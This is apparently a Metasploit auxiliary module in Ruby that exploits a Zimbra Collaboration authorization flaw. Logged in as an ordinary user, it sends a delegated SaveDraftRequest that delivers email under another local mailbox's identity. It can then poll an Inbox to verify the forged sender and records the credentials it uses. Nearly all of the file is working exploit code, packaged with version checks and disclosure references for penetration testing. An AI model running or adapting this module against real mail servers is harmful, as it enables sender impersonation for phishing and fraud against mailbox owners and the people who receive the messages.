##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Retry
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  ZIMBRA_SOAP_NS = 'http://www.w3.org/2003/05/soap-envelope'
  ZIMBRA_CONTEXT_NS = 'urn:zimbra'
  ZIMBRA_ACCOUNT_NS = 'urn:zimbraAccount'
  ZIMBRA_MAIL_NS = 'urn:zimbraMail'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Zimbra SaveDraftRequest Email Impersonation',
        'Description' => %q{
          CVE-2026-73571 is an authorization failure in Zimbra Collaboration's
          delegated SaveDraftRequest path. An ordinary authenticated user can
          select another local mailbox in the From element and cause Zimbra to
          send the message under that account's owner context. The legitimate
          MTA path also saves the message in the selected account's Sent folder.

          The vulnerability requires no delegation grant or privileged account.
          It is known to affect Zimbra 10.1.16, was absent in the original
          10.1.0 release, and is fixed in 10.1.17. The exact introduced release
          is unknown.

          When the recipient is the authenticated attacker, or recipient
          credentials are supplied, the module independently polls that Inbox
          and verifies the resulting From address. Without that verification,
          an accepted SOAP response remains unverified on every version.
        },
        'Author' => [
          'Ayoub Nabil Boubagrat', # Vulnerability discovery
          'Crypto-Cat' # Research, PoC, and module development
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-73571'],
          ['URL', 'https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories'],
          ['URL', 'https://www.rapid7.com/blog/post/ve-breaking-zimbra-identity-boundaries-part-1/'],
          ['URL', 'https://github.com/jburgess-r7/zimbra-vulnerability-tracker/blob/main/vulnerabilities/CVE-2026-73571.md']
        ],
        'DisclosureDate' => '2026-08-13',
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK, ACCOUNT_LOCKOUTS]
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [true, 'Ordinary attacker Zimbra email address']),
        OptString.new('PASSWORD', [true, 'Password for USERNAME']),
        OptString.new('VICTIM', [true, 'Local Zimbra mailbox to impersonate']),
        OptString.new('RECIPIENT', [true, 'Message recipient; USERNAME enables automatic verification']),
        OptString.new('SUBJECT', [true, 'Email subject', 'Important message']),
        OptString.new('BODY', [true, 'Email body', 'Please act on this at your earliest convenience.']),
        OptEnum.new('FORMAT', [true, 'Email body format', 'plain', %w[plain html]]),
        OptString.new('VERIFY_USERNAME', [false, 'Credentials for a local RECIPIENT mailbox']),
        OptString.new('VERIFY_PASSWORD', [false, 'Password for VERIFY_USERNAME']),
        OptInt.new('VERIFY_TIMEOUT', [true, 'Polling deadline in seconds for verified Inbox delivery', 30])
      ]
    )
  end

  def check
    reason = option_error
    return Msf::Exploit::CheckCode::Unknown(reason) if reason

    context = prepare_context
    return check_code_for_context(context) unless context[:status] == :success

    verification = prepare_delivery_verification(context)
    return check_code_for_context(verification) if verification && verification[:status] != :success

    case version_state(context[:version])
    when :affected
      Msf::Exploit::CheckCode::Appears(
        "Authenticated #{context[:attacker]} and local target #{context[:victim]} are confirmed on known affected #{context[:version]}"
      )
    when :fixed
      Msf::Exploit::CheckCode::Safe("#{context[:version]} includes the 10.1.17 authorization fix")
    when :not_affected
      Msf::Exploit::CheckCode::Safe("#{context[:version]} predates the vulnerable delegated-send path")
    else
      Msf::Exploit::CheckCode::Detected(
        "Zimbra SOAP and both accounts were verified#{version_suffix(context[:version])}, but this version is outside the known boundary"
      )
    end
  end

  def run
    validate_options!
    context = prepare_context
    fail_for_context!(context, 'prepare the impersonation') unless context[:status] == :success

    verification = prepare_delivery_verification(context)
    fail_for_context!(verification, 'prepare delivery verification') if verification && verification[:status] != :success

    marker = verification ? SecureRandom.hex(12) : nil
    context[:subject] = datastore['SUBJECT']
    context[:subject] = "#{context[:subject]} [MSF-#{marker}]" if marker

    print_status("Sending a delegated message from #{context[:victim]} to #{context[:recipient]}")
    print_status("Subject: #{context[:subject]}")
    result = send_impersonated_email(context)
    fail_for_context!(result, 'submit SaveDraftRequest') unless result[:status] == :success

    proof = delivery_proof(context, verification, marker)

    unless proof[:status] == :success
      print_warning("Email impersonation was not verified: #{proof[:reason]}")
      return
    end

    print_good(proof[:reason])
    service = report_soap_service(context[:version])
    report_vuln(
      host: rhost,
      name: 'Zimbra SaveDraftRequest Email Impersonation',
      refs: references,
      info: proof[:reason],
      # AutoCheck can create the CVE record before delivery; retain verified proof on that record.
      details: {
        key: { src: fullname },
        src: fullname,
        proof: proof[:reason]
      },
      service: service
    )
  end

  def report_vuln(opts = {})
    super(opts.merge(service: opts[:service] || @soap_service))
  end

  private

  def validate_options!
    reason = option_error
    fail_with(Failure::BadConfig, reason) if reason
  end

  def option_error
    %w[USERNAME PASSWORD VICTIM RECIPIENT SUBJECT].each do |option|
      value = datastore[option]
      return "#{option} must not be empty" if value.blank?
      return "#{option} contains an XML control character" if xml_control?(value)
    end
    %w[USERNAME VICTIM RECIPIENT].each do |option|
      value = datastore[option]
      return "#{option} must be a single line" if value.match?(/[\r\n]/)
      return "#{option} must contain a domain" unless value.include?('@')
      return "#{option} must contain at most 320 bytes" if value.bytesize > 320
    end
    return 'VICTIM must differ from USERNAME' if datastore['VICTIM'].casecmp?(datastore['USERNAME'])
    return 'SUBJECT must be a single line' if datastore['SUBJECT'].match?(/[\r\n]/)
    return 'SUBJECT must contain at most 470 bytes' if datastore['SUBJECT'].bytesize > 470
    return 'BODY must contain at most 1,048,576 bytes' if datastore['BODY'].to_s.bytesize > 1_048_576
    return 'BODY contains an XML control character' if xml_control?(datastore['BODY'].to_s)
    return 'VERIFY_USERNAME and VERIFY_PASSWORD must be supplied together' if verification_partial?
    return 'VERIFY_TIMEOUT must be between 1 and 120' unless datastore['VERIFY_TIMEOUT'].between?(1, 120)

    if verification_configured?
      %w[VERIFY_USERNAME VERIFY_PASSWORD].each do |option|
        value = datastore[option]
        return "#{option} contains an XML control character" if xml_control?(value)
      end
      return 'VERIFY_USERNAME must be a single line' if datastore['VERIFY_USERNAME'].match?(/[\r\n]/)
      return 'VERIFY_USERNAME must contain a domain' unless datastore['VERIFY_USERNAME'].include?('@')
    end

    nil
  end

  def xml_control?(value)
    value.match?(/[\x00-\x08\x0b\x0c\x0e-\x1f]/)
  end

  def verification_partial?
    datastore['VERIFY_USERNAME'].present? != datastore['VERIFY_PASSWORD'].present?
  end

  def verification_configured?
    datastore['VERIFY_USERNAME'].present? && datastore['VERIFY_PASSWORD'].present?
  end

  def prepare_context
    authentication = zimbra_authenticate(datastore['USERNAME'], datastore['PASSWORD'])
    return authentication unless authentication[:status] == :success

    record_authentication(datastore['USERNAME'], datastore['PASSWORD'], authentication)

    info = zimbra_get_info(authentication[:token])
    return info unless info[:status] == :success
    return { status: :unexpected, reason: 'GetInfoResponse omitted the authenticated account name' } if info[:name].blank?

    report_soap_service(info[:version])

    victim = zimbra_account_info(authentication[:token], datastore['VICTIM'])
    return victim.merge(reason: "Unable to resolve VICTIM: #{result_reason(victim)}") unless victim[:status] == :success
    return { status: :bad_config, reason: 'VICTIM resolves to the authenticated account' } if victim[:name].casecmp?(info[:name])

    {
      status: :success,
      token: authentication[:token],
      attacker: info[:name],
      victim: victim[:name],
      recipient: datastore['RECIPIENT'],
      version: info[:version]
    }
  end

  def prepare_delivery_verification(context)
    if !verification_configured? &&
       (context[:recipient].casecmp?(context[:attacker]) || context[:recipient].casecmp?(datastore['USERNAME']))
      return { status: :success, token: context[:token], account: context[:attacker] }
    end
    return unless verification_configured?

    authentication = zimbra_authenticate(datastore['VERIFY_USERNAME'], datastore['VERIFY_PASSWORD'])
    return authentication unless authentication[:status] == :success

    record_authentication(datastore['VERIFY_USERNAME'], datastore['VERIFY_PASSWORD'], authentication)

    info = zimbra_get_info(authentication[:token])
    return info unless info[:status] == :success
    return { status: :unexpected, reason: 'Verification GetInfoResponse omitted the account name' } if info[:name].blank?
    unless info[:name].casecmp?(context[:recipient])
      return { status: :bad_config, reason: "VERIFY_USERNAME resolves to #{info[:name]}, not RECIPIENT" }
    end

    { status: :success, token: authentication[:token], account: info[:name] }
  end

  def zimbra_authenticate(username, password)
    document = Nokogiri::XML::Builder.new(encoding: 'UTF-8') do |xml|
      xml['soap'].Envelope('xmlns:soap' => ZIMBRA_SOAP_NS) do
        xml['soap'].Body do
          xml.AuthRequest('xmlns' => ZIMBRA_ACCOUNT_NS, 'persistAuthTokenCookie' => '0') do
            xml.account(username, 'by' => 'name')
            xml.password(password)
          end
        end
      end
    end.to_xml
    result = zimbra_request(document, 'AuthResponse', ZIMBRA_ACCOUNT_NS)
    return result unless result[:status] == :success

    token = result[:node].at_xpath('./account:authToken', 'account' => ZIMBRA_ACCOUNT_NS)&.text
    return { status: :unexpected, reason: 'AuthResponse omitted authToken' } if token.blank?

    { status: :success, token: token, code: result[:code] }
  end

  def zimbra_get_info(token)
    result = zimbra_request(
      zimbra_envelope(token) { |xml| xml.GetInfoRequest('xmlns' => ZIMBRA_ACCOUNT_NS, 'sections' => 'mbox') },
      'GetInfoResponse', ZIMBRA_ACCOUNT_NS
    )
    return result unless result[:status] == :success

    {
      status: :success,
      name: result[:node].at_xpath('./account:name', 'account' => ZIMBRA_ACCOUNT_NS)&.text,
      version: result[:node].at_xpath('./account:version', 'account' => ZIMBRA_ACCOUNT_NS)&.text&.strip
    }
  end

  def zimbra_account_info(token, name)
    document = zimbra_envelope(token) do |xml|
      xml.GetAccountInfoRequest('xmlns' => ZIMBRA_ACCOUNT_NS) { xml.account(name, 'by' => 'name') }
    end
    result = zimbra_request(document, 'GetAccountInfoResponse', ZIMBRA_ACCOUNT_NS)
    return result unless result[:status] == :success

    canonical = result[:node].at_xpath('./account:name', 'account' => ZIMBRA_ACCOUNT_NS)&.text
    return { status: :unexpected, reason: 'GetAccountInfoResponse omitted the account name' } if canonical.blank?

    { status: :success, name: canonical }
  end

  def send_impersonated_email(context)
    document = zimbra_envelope(context[:token]) do |xml|
      xml.SaveDraftRequest('xmlns' => ZIMBRA_MAIL_NS, 'isDelegatedReq' => '1') do
        xml.m do
          xml.e('t' => 't', 'a' => context[:recipient])
          xml.e('t' => 'f', 'a' => context[:victim])
          xml.su(context[:subject])
          xml.mp('ct' => "text/#{datastore['FORMAT']}") { xml.content(datastore['BODY']) }
        end
      end
    end
    result = zimbra_request(document, 'SaveDraftResponse', ZIMBRA_MAIL_NS)
    return result unless result[:status] == :success

    message = result[:node].at_xpath('./mail:m', 'mail' => ZIMBRA_MAIL_NS)
    return { status: :unexpected, reason: 'SaveDraftResponse omitted its message element' } unless message
    # Delegated delivery returns an empty m element; an ID denotes an ordinary saved draft.
    if message['id'].present?
      return { status: :not_vulnerable, reason: 'Zimbra created an ordinary draft instead of entering the delegated-send path' }
    end

    { status: :success }
  end

  def wait_for_delivery(context, verification, marker)
    result = poll_until_truthy(timeout: datastore['VERIFY_TIMEOUT']) do
      result = search_marker(verification[:token], marker)
      result unless result[:status] == :not_found
    end
    return { status: :timeout, reason: 'Timed out waiting for the unique message in the verification Inbox' } unless result
    return result unless result[:status] == :success

    if result[:from]&.casecmp?(context[:victim])
      { status: :success, reason: "Verified Inbox delivery from #{context[:victim]} to #{verification[:account]}" }
    else
      { status: :not_vulnerable, reason: "The message was delivered from #{result[:from] || 'an unknown sender'}, not VICTIM" }
    end
  end

  def delivery_proof(context, verification, marker)
    return wait_for_delivery(context, verification, marker) if verification

    {
      status: :unverified,
      reason: 'The delegated response does not reveal the effective sender or prove final delivery'
    }
  end

  def search_marker(token, marker)
    document = zimbra_envelope(token) do |xml|
      xml.SearchRequest('xmlns' => ZIMBRA_MAIL_NS, 'types' => 'message', 'limit' => '10') do
        xml.query("in:inbox MSF-#{marker}")
      end
    end
    result = zimbra_request(document, 'SearchResponse', ZIMBRA_MAIL_NS)
    return result unless result[:status] == :success

    messages = result[:node].xpath('./mail:m', 'mail' => ZIMBRA_MAIL_NS)
    message = messages.find do |item|
      subject = item['su'].presence || item.at_xpath('./mail:su', 'mail' => ZIMBRA_MAIL_NS)&.text
      subject&.include?("MSF-#{marker}")
    end
    return { status: :not_found, reason: 'The unique message is not present yet' } unless message

    from = message.at_xpath('./mail:e[@t="f"]', 'mail' => ZIMBRA_MAIL_NS)&.[]('a')
    { status: :success, from: from, id: message['id'] }
  end

  def zimbra_envelope(token)
    Nokogiri::XML::Builder.new(encoding: 'UTF-8') do |xml|
      xml['soap'].Envelope('xmlns:soap' => ZIMBRA_SOAP_NS) do
        xml['soap'].Header do
          # Nokogiri::XML::Builder reserves context, so invoke its element fallback explicitly.
          xml.send(:method_missing, 'z:context', { 'xmlns:z' => ZIMBRA_CONTEXT_NS }) { xml['z'].authToken(token) }
        end
        xml['soap'].Body { yield xml }
      end
    end.to_xml
  end

  def zimbra_request(document, expected_response, namespace)
    response = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'service', 'soap'),
      'ctype' => 'application/soap+xml; charset=utf-8',
      'data' => document
    )
    return { status: :unreachable, reason: 'No response from Zimbra SOAP' } unless response
    return { status: :not_zimbra, reason: "HTTP #{response.code} did not expose Zimbra SOAP" } if [404, 405].include?(response.code)

    parsed = parse_xml_response(response)
    return parsed unless parsed[:status] == :success

    fault = parsed[:document].at_xpath('/soap:Envelope/soap:Body/soap:Fault', 'soap' => ZIMBRA_SOAP_NS)
    if fault
      fault_code = soap_fault_code(parsed[:document])
      return { status: :auth_failed, reason: 'Zimbra rejected the credentials' } if expected_response == 'AuthResponse' && fault_code
      if expected_response == 'GetAccountInfoResponse' && %w[account.NO_SUCH_ACCOUNT service.PERM_DENIED].include?(fault_code)
        return { status: :not_found, reason: 'The requested Zimbra account could not be resolved' }
      end

      reason = fault_code ? "Zimbra SOAP fault #{fault_code}" : 'Zimbra SOAP Fault without a Zimbra error code'
      return { status: :soap_error, reason: reason }
    end
    return { status: :unexpected, reason: "HTTP #{response.code} did not confirm #{expected_response}" } unless response.code == 200

    node = parsed[:document].at_xpath(
      "/soap:Envelope/soap:Body/expected:#{expected_response}",
      'soap' => ZIMBRA_SOAP_NS,
      'expected' => namespace
    )
    return { status: :success, node: node, code: response.code } if node

    { status: :unexpected, reason: "HTTP #{response.code} omitted #{expected_response}" }
  end

  def parse_xml_response(response)
    document = response.get_xml_document
    if document.nil? || !document.is_a?(Nokogiri::XML::Document) || document.errors.any? || document.root.nil?
      return { status: :unexpected, reason: "HTTP #{response.code} did not contain well-formed XML" }
    end

    { status: :success, document: document }
  end

  def soap_fault_code(document)
    namespaces = { 'soap' => ZIMBRA_SOAP_NS, 'zimbra' => ZIMBRA_CONTEXT_NS }
    document.at_xpath('/soap:Envelope/soap:Body/soap:Fault/soap:Detail/zimbra:Error/zimbra:Code', namespaces)&.text
  end

  def version_state(version_string)
    match = version_string.to_s.match(/\A\d+\.\d+\.\d+/)
    return :unknown unless match

    version = Rex::Version.new(match[0])
    return :affected if version == Rex::Version.new('10.1.16')
    return :not_affected if version == Rex::Version.new('10.1.0')
    return :fixed if version >= Rex::Version.new('10.1.17')

    :unknown
  end

  def check_code_for_context(result)
    reason = result_reason(result)
    case result[:status]
    when :not_zimbra
      Msf::Exploit::CheckCode::Safe(reason)
    else
      Msf::Exploit::CheckCode::Unknown(reason)
    end
  end

  def fail_for_context!(result, operation)
    reason = result_reason(result)
    case result[:status]
    when :unreachable
      fail_with(Failure::Unreachable, "Unable to #{operation}: #{reason}")
    when :auth_failed
      fail_with(Failure::NoAccess, "Unable to #{operation}: #{reason}")
    when :not_found, :bad_config
      fail_with(Failure::BadConfig, "Unable to #{operation}: #{reason}")
    when :not_vulnerable
      fail_with(Failure::NotVulnerable, "Unable to #{operation}: #{reason}")
    else
      fail_with(Failure::UnexpectedReply, "Unable to #{operation}: #{reason}")
    end
  end

  def result_reason(result)
    result[:reason].presence || result[:status].to_s
  end

  def record_authentication(username, password, authentication)
    @recorded_credentials ||= {}
    return if @recorded_credentials[username]

    service = report_soap_service
    service_data = {
      origin_type: :service,
      address: rhost,
      port: rport,
      service_name: 'zimbra-soap',
      protocol: 'tcp',
      access_level: 'user'
    }
    service_data[:service_id] = service.id if service
    store_valid_credential(
      user: username,
      private: password,
      private_type: :password,
      proof: authentication[:code],
      service_data: service_data
    )
    @recorded_credentials[username] = true
  end

  def report_soap_service(version = nil)
    return @soap_service if version.blank? && @soap_service

    common = { host: rhost, port: rport, proto: 'tcp' }
    tcp = common.merge(name: 'tcp', parents: nil)
    web = ssl ? common.merge(name: 'https', parents: common.merge(name: 'ssl', parents: tcp)) : common.merge(name: 'http', parents: tcp)
    info = 'Zimbra SOAP API'
    info = "#{info} #{version}" if version.present?
    @soap_service = report_service(
      common.merge(
        name: 'zimbra-soap',
        info: info,
        resource: { uri: normalize_uri(target_uri.path, 'service', 'soap') },
        parents: web
      )
    )
  end

  def version_suffix(version)
    version.present? ? " on #{version}" : ''
  end
end
